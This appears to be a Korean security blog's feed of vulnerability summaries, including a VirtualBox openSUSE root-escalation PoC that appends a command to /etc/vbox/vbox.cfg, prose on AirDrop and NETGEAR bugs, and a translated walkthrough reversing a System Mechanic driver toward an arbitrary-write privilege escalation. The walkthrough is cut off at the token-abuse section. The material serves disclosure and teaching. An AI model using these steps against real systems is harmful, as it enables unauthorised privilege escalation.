    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/78">virtualbox: CVE-2021-25319: missing sticky bit in openSUSE packaging for /etc/box allows local root exploit for members of vboxusers group </a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VirtualBox for openSUSE</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>oracle사의 오픈소스 가상 머신 소프트웨어인 VirtualBox openSUSE 패키지 배포판에서 특정 계정 그룹의 유저가 root로 권한 상승이 가능한 취약점이 발견되었습니다.</p><p><code>vboxusers</code> group은 VirtualBox 자동시작을 위해 도입되었으며 VirtualBox의 여러 구성 파일이 포함된  <code>/etc/vbox</code> 디렉터리에 쓰기 권한이 부여된 유저 그룹입니다. 그러나 <code>/etc/vbox</code> 디렉터리에 sticky bit 설정이 누락되어 있어 <code>vboxusers</code>에 속한 모든 유저가 해당 디렉터리의 파일을 임의로 수정할 수 있습니다.</p><blockquote><p>sticky bit가 설정된 디렉터리에는 누구나 파일을 생성할 수 있지만 삭제 및 수정은 생성한 유저와 root만 가능합니다.</p></blockquote><p>위 취약점을 악용하면  <code>vboxautostart.sh</code>, <code>vboxdrv.sh</code>및 <code>vboxweb-service.sh</code>와 같이 root 권한의 VirtualBox bash script에서 사용되는 <code>/etc/vbox/vbox.cfg</code> 파일을 수정할 수 있어 root 권한으로 현재 작업 디렉터리(CWD) 내의 제한된 명령 및 파일 실행이 가능합니다. PoC는 설명과 함께 아래에서 확인할 수 있습니다.</p><pre><code class="hljs cpp"><span class="hljs-comment">//vboxusers 그룹 nobody 생성</span>root<span class="hljs-meta"># su -g vboxusers nobody</span>nobody$ cd /etc/vboxnobody$ cp vbox.cfg vbox.cfg.<span class="hljs-keyword">new</span><span class="hljs-comment">// nobody에서 기존 vbox.cfg 삭제후 임의 명령이 포함된 vbox.cfg로 대체</span>nobody$ rm -f vbox.cfgnobody$ mv vbox.cfg.<span class="hljs-keyword">new</span> vbox.cfgnobody$ echo <span class="hljs-string">&quot;touch /root/evil&quot;</span> &gt;&gt;vbox.cfgnobody$ <span class="hljs-built_in">exit</span><span class="hljs-comment">// vboxautostart 스크립트가 실행되면 트리거</span>root<span class="hljs-meta"># systemctl start vboxautostart.service</span>root<span class="hljs-meta"># ls -lh /root/evil</span>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">0</span>  <span class="hljs-number">2.</span> Mär <span class="hljs-number">12</span>:<span class="hljs-number">14</span> /root/evil</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>oracle</tag>
      
      <tag>virtualbox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 애플 AirDrop 사용자 개인 정보 유출 취약점</title>
    <link href="/2021/04/29/idioth/2021-04-29/"/>
    <url>/2021/04/29/idioth/2021-04-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://therecord.media/airdrop-bugs-expose-apple-users-email-addresses-phone-numbers/">AirDrop bugs expose Apple users’ email addresses, phone numbers</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>AirDrop 기능이 켜져 있는 애플 기기</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>애플의 파일 전송 기능인 AirDrop에서 해커가 사용자의 핸드폰 번호, 이메일 주소 등의 개인 정보를 유출할 수 있는 두 가지 취약점이 발견되었습니다.</p><p>이 두 가지 버그는 서로를 검색하고 알고 있는 사용자인지 확인하는 AirDrop 연결 초반 인증 프로세스에 존재합니다. 애플 기기는 기기 스펙과 핸드폰 번호, Apple ID, 이메일 주소 등을 포함한 개인 데이터와 같은 기기와 소유자에 관한 정보를 포함한 AWDL(Apple Wireless Direct Link) 패킷을 교환합니다. 이러한 데이터들이 intercept 되는 것을 막기 위해 Apple은 SHA256 해쉬 함수를 사용하여 데이터를 보호합니다.</p><p>하지만 AirDrop이 켜져있는 상태에서 기기는 discovery packet을 모든 방향으로 항상 브로드 캐스트 합니다. 해커와 물리적으로 가까운(블루투스 거리) 사용자는 WiFi 카드를 통해 메시지들을 intercept 하여 해쉬된 데이터의 일부를 복구할 수 있습니다.</p><p>애플은 2019년 5월부터 <a href="https://www.zdnet.com/article/apples-awdl-protocol-plagued-by-flaws-that-enable-tracking-and-mitm-attacks/">이러한 이슈</a>에 대해서 알고 있었으며 취약점을 찾은 Research 팀에서 새로운 PrivateDrop protocol 사용을 제안하였으나 아직 애플에게 답변을 받지 못했다고 합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>apple</tag>
      
      <tag>airdrop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31802: NETGEAR Nightawk R7000 RCE</title>
    <link href="/2021/04/28/fabu1ous/2021-04-28/"/>
    <url>/2021/04/28/fabu1ous/2021-04-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r7000-httpd-preauth-rce/">NETGEAR Nightawk R7000 PreAuth RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Netgear Nighthawk R7000 firmware &lt;= 1.0.11.116</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>NETGEAR R7000 라우터에서 인증 절차를 무시하고 원격 코드를 실행할 수 있는 취약점이 발견되었습니다. 해당 취약점은 HTTP 요청을 처리하는 과정에서 user supplied data에 대한 검증 미흡으로 발생하고 이를 악용해 해커는 루트 권한의 원격 코드 실행을 할 수 있습니다. 유저는 Httpd의  <code>/backup.cgi</code> URL을 통해  파일을 업로드할 수 있습니다. 두 개의 변수로 해당 파일의 크기를 표현하는데  그중 하나는 HTTP POST Request Header의 <code>Content-length</code> 값을, 다른 하나는 HTTP POST Request Body의 <code>Content-length</code> 값을 사용합니다.</p><p>프로그램은 <code>malloc</code>을 호출해 파일의 데이터를 저장하기 위한  <code>Content-length+600</code> 크기의 청크를 할당합니다. HTTP POST Request Header의 <code>Content-length</code>는 유저가 제어할 수 있는 데이터이므로 임의 크기의 chunk를 할당할 수 있습니다. 그 후  <code>memcpy</code>를 사용해 할당된 청크에 파일 데이터를 옮기는데 HTTP POST Request Body의 <code>Content-length</code> 크기만큼 데이터를 복사합니다. 마찬가지로 HTTP POST Request Body의 <code>Content-length</code>는 유저 제어가 가능한 데이터로 heap overflow를 발생시킬 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>heap overflow</tag>
      
      <tag>firmware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Exploiting System Mechanic Driver Part 2</title>
    <link href="/2021/04/28/l0ch/exploiting-driver-part2/"/>
    <url>/2021/04/28/l0ch/exploiting-driver-part2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Part 1 보러가기 : <a href="https://hackyboiz.github.io/2021/04/21/l0ch/exploiting-driver/">Exploiting System Mechanic Driver Part 1</a></p></blockquote><blockquote><p>원문 글 : <a href="https://labs.yarix.com/2021/04/exploiting-system-mechanic-driver/">Exploiting System Mechanic Driver</a></p></blockquote><h1 id="Root-Cause-Analysis"><a href="#Root-Cause-Analysis" class="headerlink" title="Root Cause Analysis"></a>Root Cause Analysis</h1><h2 id="Analyzing-SUB-2C580-Dispatch-Routine"><a href="#Analyzing-SUB-2C580-Dispatch-Routine" class="headerlink" title="Analyzing SUB_2C580 (Dispatch Routine)"></a>Analyzing SUB_2C580 (Dispatch Routine)</h2><p><code>DeviceIoControl</code> API가 장치에서 호출될 때의 디스패치 루틴은 <code>SUB_2C580</code> 함수이다. IDA Pro의 디컴파일러를 사용하면 이 함수가 2개의 인수를 받는 것을 볼 수 있다. </p><ol><li><code>DeviceObject</code>에 대한 포인터 - <code>a1</code></li><li>장치에 전달 된 IRP 구조체에 대한 포인터 - <code>a2</code></li></ol><p>함수는 <code>DeviceIoControl</code>이 보낸 IRP 포인터에서 메모리 버퍼를 포함하는 구조체인  <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">_IO_STACK_LOCATION</a>를 추출하고 지역 변수 v5에 저장한다.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled.png" alt="exploiting-driver-part2/Untitled.png"></p><p>버퍼에 포함된 IOCTL(<code>Parameters.Read.ByteOffset.LowPart</code> 멤버)과 드라이버 코드의 하드 코딩된 값(<code>2252803</code> decimal, <code>0x226003</code> hex)을 비교하는 것을 볼 수 있다.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%201.png" alt="exploiting-driver-part2/Untitled%201.png"></p><p>비교 후 같으면 IOCTL 코드 <code>0x226003</code>와 관련된 함수인 <code>SUB_166D0</code> 를 호출한다. <code>SUB_166D0</code>함수를 분석하기 전 함수에 전달되는 세 가지 인수 <code>v3</code>, <code>v7</code> 및 <code>v4</code>에 대해 설명해야 한다.</p><ul><li><code>v3</code> : <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iois32bitprocess">IoIs32BitProcess</a> 함수의 반환 값이며 호출 프로세스가 32비트(TRUE)인지 64비트(FALSE)인지 알려준다.</li><li><code>v7</code> : 실제 유저 버퍼에 대한 포인터이며, 이 경우 user-space의 주소를 가리킨다. 이 주소는 <code>DeviceIoControl</code> API에 인수로 전달된 주소이다.</li><li><code>v4</code> : 버퍼의 크기</li></ul><h2 id="Analyzing-SUB-166D0"><a href="#Analyzing-SUB-166D0" class="headerlink" title="Analyzing SUB_166D0"></a>Analyzing SUB_166D0</h2><p>이 함수는 이전 함수들보다 복잡하기 때문에 다양한 반환 값을 분석해 코드 흐름과 제약 조건을 이해하는 것으로 시작했다. 각각 상태 코드가 있는 5개의 return 문이 있다. 이를 16진수로 변환하고 나열하면 다음과 같다.</p><ol><li><code>return 0xC0000023 == STATUS_BUFFER_TOO_SMALL</code></li><li><code>return 0xC0000023 == STATUS_BUFFER_TOO_SMALL</code></li><li><code>return 0xC0000001 == STATUS_UNSUCCESSFUL</code></li><li><code>return 0xC000000D == STATUS_INVALID_PARAMETER</code></li><li><code>return 0x0 == STATUS_SUCCESS</code></li></ol><p>각각 MSDN에서 찾아보고 그 의미를 기록해 각 상태 코드가 무엇을 의미하는지 알았으므로 각 코드 블록이 무엇을 하는지 추측할 수 있다. </p><p>첫 번째 <code>STATUS_BUFFER_TOO_SMALL</code> : 앞서 말했듯이 <code>a1</code>은 호출자가 함수에 전달한 첫 번째 매개변수이며 <code>IoIs32BitProcess</code>의 반환 값이고 <code>a3</code>은 버퍼 크기이다. 따라서 호출 프로세스가 32비트인 경우 버퍼 크기는 <code>0xC</code> 이상이어야 한다는 것을 알 수 있다.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%202.png" alt="exploiting-driver-part2/Untitled%202.png"></p><p>64비트 프로세스인 경우 <code>0x18</code> 이상이어야 한다. 두 경우 모두 버퍼 크기 검사를 통과하면 <code>LABEL_6</code>으로 이동한다. 64비트의 경우 입력 구조체를 8bytes 길이의 3개로 나누어 더 많은 로컬 변수가 생성된다.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%203.png" alt="exploiting-driver-part2/Untitled%203.png"></p><pre><code class="hljs cpp">v8 = *(_QWORD *)a2;v9 = *((_QWORD *)a2 + <span class="hljs-number">1</span>);v10 = *((_QWORD *)a2 + <span class="hljs-number">2</span>);</code></pre><p>위에서 디컴파일된 코드를 살펴보면 입력 버퍼가 3개의 서로 다른 8bytes 필드로 구성된 일종의 24bytes 길이 구조체일 것으로 추측했다. <code>v8</code>, <code>v9</code> 및 <code>v10</code>이 증가 오프셋을 사용해 입력 버퍼 주소에 액세스하고 해당 포인터를 역참조해 상대 값을 검색하는 것을 볼 수 있다.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%204.png" alt="exploiting-driver-part2/Untitled%204.png"></p><p>참고 : 이는 약간의 포인터 연산으로 수행되어 다음과 같이 25, 26, 27 행을 해석할 수 있다.</p><ul><li>25행 : <code>a2</code>를 64비트 값 <code>(_QWORD *)</code>에 대한 포인터로 취급하고 해당 포인터를 역참조한다.</li><li>26행 : 위와 동일하지만 <code>a2</code>를 64비트 값 포인터로 캐스팅한 후 <code>+1</code>이 추가된다. 이는 QWORD이므로 다음 8bytes 값을 의미한다.</li><li>27행 : 위의 행과 동일하지만 <code>+2</code>로 세 번째 QWORD로 건너뛰므로 <code>a2</code> 다음 16bytes 값을 의미한다.</li></ul><p>다음 코드는 <code>LABEL_6</code>으로 시작한다.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%205.png" alt="exploiting-driver-part2/Untitled%205.png"></p><p><code>qword_38B28</code>은 런타임에 32비트 값 <code>0x00000009</code>의 주소이다. WinDbg를 사용하여 이 함수에 breakpoint를 설정하고 이전에 찾은 IOCTL 코드로 <code>DeviceIoControl</code> API를 호출하여 확인했다. 임의의 IOCTL 요청을 보낼 수 있도록 오픈소스 소프트웨어인 <a href="https://github.com/VoidSec/ioctlpus">IOCTLpus</a>를 활용했다. IOCTLpus는 Jackson Thuraisamy에서 만들었지만 현재 VoidSec에서 포크 중 하나를 적극적으로 관리하고 있다. 임의의 입력으로 <code>DeviceIoControl</code> 요청을 수행하는 데 사용할 수 있는 툴이다.(Burp Repeater와 유사한 기능을 포함)</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%206.png" alt="exploiting-driver-part2/Untitled%206.png"></p><p>IOCTLpus를 사용하여 임의의 <code>DeviceIoControl</code> 요청을 수행하고 <code>UserBuffer</code>의 값을 변경하면서 취약점이 널 포인터 역 참조가 아님을 발견했다. ioctlbf 퍼저가 모든 버퍼의 값을 0으로 설정해버려 임의 쓰기가 아닌 널 포인터 역 참조처럼 보인 것이다. </p><blockquote><p>Protip : WinDbg를 디버기에 연결 한 직후 <code>lm vm amp</code> 으로 드라이버의 base address를 가져온다. 그 뒤 IDA-&gt;Edit-&gt;Segments-&gt;Rebase 로 현재 파일의 base address를 설정하면 디컴파일된 코드와 WinDbg에서 일관성이 있도록 분석할 수 있다.</p></blockquote><p>34 행에서 <code>qword_38B28</code>이 가리키는 DWORD (32 비트 값)를 <code>v4</code>와 비교하는 것을 볼 수 있다. 이 변수는 <code>v8</code>에 포함된 값으로 초기화되며, 이는 입력 구조체의 첫 번째 필드 값이다. 따라서 입력 버퍼의 처음 4bytes에 <code>qword_38B28 (0x00000009)</code>보다 크거나 같은 값이 포함되어 있으면 검사가 실패하고 <code>STATUS_INVALID_PARAMETER</code>를 반환한다. 검사가 성공하면 입력 구조체의 첫 번째 필드 값이 switch case와 같은 코드에 대한 인덱스로 사용된다.</p><pre><code class="hljs cpp">v8 = *(_QWORD *)(qword_38B28 + <span class="hljs-number">16</span>i64 * v4 + <span class="hljs-number">8</span>);-&gt; v8 = *(_QWORD *)(<span class="hljs-number">9</span> + <span class="hljs-number">16</span> * field1_user_buffer + <span class="hljs-number">8</span>);</code></pre><p>switch case 인덱스인 이유는 다음 섹션에서 v8의 주소를 매개변수로 사용하는 <code>SUB_16C40</code> 함수를 분석하면서 확인할 수 있다.</p><p><code>SUB_166D0</code> 의 전체 코드는 다음과 같다.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">DriverVulnerableFunction</span><span class="hljs-params">(<span class="hljs-keyword">bool</span> BoolIs32BitProcess, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *userBuffer, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bufferSize)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> field1_32; <span class="hljs-comment">// eax</span>  __int64 field2_32; <span class="hljs-comment">// r8</span>  __int64 field3_32_ptr; <span class="hljs-comment">// rbx</span>  __int64 field1_64; <span class="hljs-comment">// [rsp+20h] [rbp-28h] BYREF</span>  __int64 field2_64; <span class="hljs-comment">// [rsp+28h] [rbp-20h]</span>  __int64 field3_64_ptr; <span class="hljs-comment">// [rsp+30h] [rbp-18h]</span>  __int64 *v11; <span class="hljs-comment">// [rsp+38h] [rbp-10h]</span>  __int64 v12; <span class="hljs-comment">// [rsp+68h] [rbp+20h] BYREF</span>  <span class="hljs-keyword">if</span> ( BoolIs32BitProcess )  &#123;                                             <span class="hljs-comment">// 32 bit Process</span>    <span class="hljs-keyword">if</span> ( bufferSize &gt;= <span class="hljs-number">12</span> )    &#123;                                           <span class="hljs-comment">// Struct contaning 3 32-bits fields</span>      field1_32 = *userBuffer;                  <span class="hljs-comment">// (int)userBuffer[0];</span>      field2_32 = (<span class="hljs-keyword">int</span>)userBuffer[<span class="hljs-number">1</span>];      field3_32_ptr = (<span class="hljs-keyword">int</span>)userBuffer[<span class="hljs-number">2</span>];      <span class="hljs-keyword">goto</span> LABEL_6;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC0000023</span>i64;                       <span class="hljs-comment">// STATUS_BUFFER_TOO_SMALL</span>  &#125;  <span class="hljs-keyword">if</span> ( bufferSize &lt; <span class="hljs-number">24</span> )                        <span class="hljs-comment">// 64 bit Process</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC0000023</span>i64;                       <span class="hljs-comment">// STATUS_BUFFER_TOO_SMALL</span>  field1_64 = *(_QWORD *)userBuffer;            <span class="hljs-comment">// Struct contaning 3 64-bits fields</span>  field2_64 = *((_QWORD *)userBuffer + <span class="hljs-number">1</span>);  field3_64_ptr = *((_QWORD *)userBuffer + <span class="hljs-number">2</span>);  field3_32_ptr = field3_64_ptr;  field2_32 = field2_64;  field1_32 = field1_64;LABEL_6:  <span class="hljs-keyword">if</span> ( !qword_FFFFF80068928B28 )    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC0000001</span>i64;                       <span class="hljs-comment">// STATUS_UNSUCCESSFUL</span>  <span class="hljs-keyword">if</span> ( field1_32 &gt;= *(_DWORD *)qword_FFFFF80068928B28 )<span class="hljs-comment">// MUST BE &lt; 9</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xC000000D</span>i64;                       <span class="hljs-comment">// STATUS_INVALID_PARAMETER</span>  field2_64 = field2_32;  field1_64 = *(_QWORD *)(qword_FFFFF80068928B28 + <span class="hljs-number">16</span>i64 * field1_32 + <span class="hljs-number">8</span>);<span class="hljs-comment">// jmp table (0-8)</span>  LODWORD(field3_64_ptr) = *(_DWORD *)(qword_FFFFF80068928B28 + <span class="hljs-number">16</span>i64 * field1_32 + <span class="hljs-number">16</span>);<span class="hljs-comment">// set lower 32 bits of fields3_64</span>  v11 = &amp;v12;  jmptable(&amp;field1_64);                         <span class="hljs-comment">// addr jmp table based</span>  <span class="hljs-keyword">if</span> ( BoolIs32BitProcess )    *(_DWORD *)field3_32_ptr = v12;  <span class="hljs-keyword">else</span>    *(_QWORD *)field3_32_ptr = v12;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;                                  <span class="hljs-comment">// SUCCESS</span>&#125;</code></pre><h2 id="Analyzing-SUB-16C40"><a href="#Analyzing-SUB-16C40" class="headerlink" title="Analyzing SUB_16C40"></a>Analyzing SUB_16C40</h2><p>이 함수는 디컴파일 코드가 그다지 도움이 되지 않았고 해석에 오해의 소지가 있어 골칫거리였다. </p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_16C40</span><span class="hljs-params">(__int64 a1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// rcx</span>  __int64 v3; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">void</span> *v4; <span class="hljs-comment">// rsp</span>  <span class="hljs-keyword">char</span> vars20; <span class="hljs-comment">// [rsp+20h] [rbp+20h] BYREF</span>  v2 = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(a1 + <span class="hljs-number">16</span>);  v3 = v2;  <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0x20</span> )  &#123;    v2 = <span class="hljs-number">40</span>i64;    v3 = <span class="hljs-number">32</span>i64;  &#125;  v4 = alloca(v2);  <span class="hljs-keyword">if</span> ( v3 - <span class="hljs-number">32</span> &gt; <span class="hljs-number">0</span> )    qmemcpy(&amp;vars20, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">32</span>i64), v3 - <span class="hljs-number">32</span>);  **(_QWORD **)(a1 + <span class="hljs-number">24</span>) = (*(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD, _QWORD))a1)(                             **(_QWORD **)(a1 + <span class="hljs-number">8</span>),                             *(_QWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">8</span>i64),                             *(_QWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">16</span>i64),                             *(_QWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + <span class="hljs-number">24</span>i64));&#125;</code></pre><p>위의 코드에서는 유저가 제어할 수 있는 위치에 <code>userBuffer</code>의 값을 복사할 때 가능한 임의 쓰기 취약점이 트리거 될 수 있으므로 <code>qmemcpy</code>가 적합한 함수라고 생각했으며 <code>memcpy(* destination, * source, size_t);</code>를 완전히 제어할 수 있을  것으로 추측했다. 그러나 때로는 나무에 집중해 숲을 보지 못하게 된다. 많은 시간을 보낸 후 Access violation을 일으키는 명령이 memcpy 자체가 아닌 memcpy 이후에 발생하는 다른 명령과 관련이 있다는 것을 발견했다. 이전 섹션에서 생각해 보면 <code>amp+6c8d</code>에서 액세스 위반이 발생했다. 디컴파일 된 의사 코드가 아닌 원시 어셈블리를 살펴보면 더 쉬워진다.</p><pre><code class="hljs cpp">.text:<span class="hljs-number">0000000000016</span>C6A                 sub     rsp, rcx.text:<span class="hljs-number">0000000000016</span>C6D                 <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0F</span>FFFFFFFFFFFFFF0h.text:<span class="hljs-number">0000000000016</span>C71                 lea     rcx, [rax<span class="hljs-number">-20</span>h].text:<span class="hljs-number">0000000000016</span>C75                 test    rcx, rcx.text:<span class="hljs-number">0000000000016</span>C78                 jle     <span class="hljs-keyword">short</span> loc_16C89.text:<span class="hljs-number">0000000000016</span>C7A                 mov     rsi, [rbx+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C7E                 lea     rsi, [rsi+<span class="hljs-number">20</span>h].text:<span class="hljs-number">0000000000016</span>C82                 lea     rdi, [rsp+var_s20].text:<span class="hljs-number">0000000000016</span>C87                 rep movsb.text:<span class="hljs-number">0000000000016</span>C89.text:<span class="hljs-number">0000000000016</span>C89 loc_16C89:                              ; CODE XREF: sub_16C40+<span class="hljs-number">38</span>↑j.text:<span class="hljs-number">0000000000016</span>C89                 mov     rsi, [rbx+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C8D                 mov     rcx, [rsi].text:<span class="hljs-number">0000000000016</span>C90                 mov     rdx, [rsi+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C94                 mov     r8, [rsi+<span class="hljs-number">10</span>h].text:<span class="hljs-number">0000000000016</span>C98                 mov     r9, [rsi+<span class="hljs-number">18</span>h].text:<span class="hljs-number">0000000000016</span>C9C                 call    qword ptr [rbx]</code></pre><p><code>16C8D</code>, <code>mov rcx, [rsi]</code>에서 액세스 위반이 발생하지만 해당 명령 바로 앞을 보면 <code>memcpy</code>에 대한 호출은 찾을 수 없었다. 이를 밝히기 위해 좀 더 파헤쳤고 Reverse Engineering Discord Server의 멤버가 IDA가 디컴파일에서  <code>qmempy</code>로 나타내는 이유는 <code>rsi</code>에서 <code>rdi</code>로 <code>rcx</code> bytes 만큼 복사할 때 사용하는 <code>rep movsb</code> 의 <code>movsb</code>때문임을 설명했다. 어쨌든 <code>mov rcx, [rsi]</code> 명령어를 살펴보고 <code>rsi</code> 할당과 사용을 역추적하면 그 값이 <code>rcx</code>레지스터에서 나온다는 것을 확인했다.</p><pre><code class="hljs cpp">.text:<span class="hljs-number">0000000000016</span>C47                 mov     rbx, rcx....text:<span class="hljs-number">0000000000016</span>C89                 mov     rsi, [rbx+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C8D                 mov     rcx, [rsi]</code></pre><p>RCX 레지스터(x86_64 fastcall convention)는 함수 인수(<code>RCX</code>, <code>RDX</code>, <code>R8</code>, <code>R9</code>, 나머지 인수는 스택에 전달됨)를 전달하는 데 사용된다. <code>SUB_16C40</code>은 <code>SUB_166D0</code>에서 하나의 인수 <code>SUB_166D0의 v8</code> 만 받으므로 RCX에는 <code>field1</code>에서 가져온 해당 인수의 주소가 포함된다. 이제 전체 유저 버퍼를 ioctlbf 퍼저가 0으로 설정해 액세스 위반이 발생했음을 알 수 있다. 이 경우 첫 번째 유저 버퍼는 <code>v8</code>의 값 <code>v8 = *(_QWORD*)(9+16*field1_user_buffer + 8);</code>을 계산하는 데 사용되며 <code>mov rcx, [rsi]</code> 명령이 실행될 때 <code>rsi</code>는 역참조 할 유효하지 않은 메모리 위치에 대한 포인터가 된다. 어셈블리를 다시 살펴보면 <code>rcx</code>, <code>rdx</code>, <code>r8</code> 및 <code>r9</code> 레지스터를 채우는 다른 fastcall 호출을 하는 것을 볼 수 있다.</p><pre><code class="hljs cpp">.text:<span class="hljs-number">0000000000016</span>C8D                 mov     rcx, [rsi].text:<span class="hljs-number">0000000000016</span>C90                 mov     rdx, [rsi+<span class="hljs-number">8</span>].text:<span class="hljs-number">0000000000016</span>C94                 mov     r8, [rsi+<span class="hljs-number">10</span>h].text:<span class="hljs-number">0000000000016</span>C98                 mov     r9, [rsi+<span class="hljs-number">18</span>h].text:<span class="hljs-number">0000000000016</span>C9C                 call    qword ptr [rbx]</code></pre><p>여기서 흥미로운 점이 나타나는데, <code>16C47 mov rbx, rcx</code> 이후 <code>rbx</code>가 유효한 메모리면 call opcode에 의해 호출되는 것을 확인할 수 있다. 이때  <code>RBX</code>의 값은 런타임에서 계산되기 때문에 IDA의 디컴파일 기능은 위 명령어의 결과를 따라갈 수 없다. <code>v8</code>은 <code>sub_166D0</code>에서 볼 수 있듯이 0~8까지의 값을 가지며 호출할 함수 index로 활용되며 <code>v8</code>의 값에 따라 각각 호출되는 함수들은 다음과 같다.</p><ol><li><code>sub_2CBA0</code></li><li><code>sub_2CB20</code></li><li><code>sub_2C960</code></li><li><code>sub_2C850</code></li><li><code>sub_2C7F0</code></li><li><code>sub_18D20</code></li><li><code>sub_2C510</code></li><li><code>sub_2C360</code></li><li><strong><code>sub_2C460</code> &lt;&lt;</strong></li></ol><h2 id="Analyzing-sub-2C460"><a href="#Analyzing-sub-2C460" class="headerlink" title="Analyzing sub_2C460"></a>Analyzing sub_2C460</h2><p>위 함수들 중 제한된 arbitrary write가 가능하다는 점에서 익스플로잇에 사용할 함수로는 <code>sub_2C460</code>가 가장 유력했다.</p><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">jmp8</span><span class="hljs-params">(_DWORD *a1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-38h]</span>  v2 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( !a1 )  <span class="hljs-comment">// must be === 0</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFE</span>;  sub_FFFFF800689067D0((__int64)a1, <span class="hljs-number">0x2C</span>ui64);  <span class="hljs-keyword">if</span> ( *a1 != <span class="hljs-number">44</span>i64 )    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;  qmemcpy(a1, &amp;unk_FFFFF80068926BA8, <span class="hljs-number">0x2C</span>ui64);  <span class="hljs-keyword">return</span> v2;&#125;</code></pre><p><code>sub_2C460</code> 은 권한상승 익스플로잇에 거의 완벽한 <code>0xFFFFFFFE</code>를 반환한다.</p><h1 id="Constraint-amp-Analysis-Recap"><a href="#Constraint-amp-Analysis-Recap" class="headerlink" title="Constraint&amp;Analysis Recap"></a>Constraint&amp;Analysis Recap</h1><p>지금까지 분석한 내용은 다음과 같다.</p><ul><li>취약한 드라이버에 보낼 수 있는 제어 가능한 유저 버퍼가 3개의 8bytes 필드로 구성된 24bytes 크기의 구조체이다.</li><li>첫 번째 필드는 항상 9보다 작은 정수이며 해당 값에 따라 호출되는 함수 중 <code>sub_2C460</code>에 도달하기 위해서는 8이어야 한다. (<code>sub_2C460</code> 참고)</li><li>두 번째 필드는 역참조 될 때 0을 가리키는 주소에 대한 유효한 포인터여야 한다. (<code>sub_2C460</code> 참고)</li></ul><p>세 번째 필드에는 <code>sub_2C460</code>의 반환값(<code>0xFFFFFFFE</code>)에 의해 기록될 주소가 포함되어야 한다.</p><h1 id="Abusing-Token-Privileges-for-LPE"><a 